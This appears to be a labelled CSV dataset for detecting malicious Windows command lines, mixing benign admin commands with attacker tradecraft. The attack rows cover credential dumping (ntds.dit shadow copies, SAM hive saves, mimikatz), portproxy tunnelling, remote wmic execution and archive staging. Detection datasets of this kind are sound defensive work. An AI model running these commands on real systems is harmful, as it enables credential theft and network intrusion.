"command","label"
"arp.exe -a
curl.exe www.ip-api[.]com
dnscmd.exe . /enumrecords /zone {REDACTED}
dnscmd.exe . /enumzones
dnscmd.exe /enumrecords {REDACTED} . /additional
ipconfig.exe /all
ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
net.exe localgroup administrators
net.exe group /dom net.exe group ""Domain Admins"" /dom
netsh.exe interface firewall show all
netsh.exe interface portproxy show all
netsh.exe interface portproxy show v4tov4
netsh.exe firewall show all
netsh.exe portproxy show v4tov4
netstat.exe -ano
reg.exe query hklm\software\
systeminfo.exe
tasklist.exe /v
whoami.exe
wmic.exe volume list brief
wmic.exe service brief
wmic.exe product list brief
wmic.exe baseboard list full
wevtutil.exe qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]","1"
"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PortProxy\v4tov4
\cp\0.0.0.0/49275 | {redacted IP address}/8443.","1"
"netstat.exe -s -p tcp udp","0"
"eventcreate.exe [/s <computer> [/u <domain\user> [/p <password>]] {[/l {APPLICATION|SYSTEM}]|[/so <srcname>]} /t {ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT} /id <eventID> /d <description>","0"
"7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z
C:\Windows\system32\pcwrun.exe
C:\Users\Administrator\Desktop\Win.exe
C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log
""cmd.exe"" /c dir.exe \\127.0.0.1\C$ /od
""cmd.exe"" /c ping –a –n 1 <IP address>
""cmd.exe"" /c wmic.exe /user:<username> /password:<password> process call create ""net.exe stop \""<service name>\"" > C:\Windows\Temp\tmp.log""
cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1
net.exe use \\127.0.0.1\IPC$ /y /d
powershell.exe start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hidden
rar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\
wmic.exe /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd.exe /c whoami.exe
xcopy.exe C:\windows\temp\hp d:\{REDACTED}","1"
"ftp/gpresult.exe /s srvmain /u maindom\hiropln /p p@ssW23 /r","0"
"cmd.exe /c vssadmin.exe create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd.exe /c copy.exe \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp","1"
"dir.exe C:\Users\{REDACTED}\.ssh\known_hosts
dir.exe C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profiles
mimikatz.exe
reg.exe query hklm\software\OpenSSH
reg.exe query hklm\software\OpenSSH\Agent
reg.exe query hklm\software\realvnc
reg.exe query hklm\software\realvnc\vncserver
reg.exe query hklm\software\realvnc\Allusers
reg.exe query hklm\software\realvnc\Allusers\vncserver
reg.exe query hkcu\software\{REDACTED}\putty\session
reg.exe save hklm\sam ss.dat
reg.exe save hklm\system sy.dat","1"
"cmd.exe /c netsh.exe interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=","1"
"net localgroup Administrators pgwnooqy /add","0"
"cmd.exe /Q /c *dir.exe 1> \\127.0.0.1\ADMIN$\__1684956600.123456 2>&1","1"
"Get-EventLog security -instanceid 4624 -after
{redacted date} | fl * | Out-File
'C:\users\public\documents\user.dat'","1"
"mklink.exe /d \MyFolder \Users\User1\Documents
mklink.exe /h \MyFile.file \User1\Documents\example.file
rd \MyFolder
del \MyFile.file","0"
"wmic.exe process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\","1"
"@echo off
rem  This batch program formats and checks new disks.
rem  It is named Checknew.bat.
rem
rem echo Insert new disk in Drive B.
pause
format b: /v chkdsk b:","0"
"ftype.exe txtfile /assoc.exe .pl=PerlScript
ftype.exe PerlScript=perl.exe %1 %*/set PATHEXT=.pl;%PATHEXT%","0"
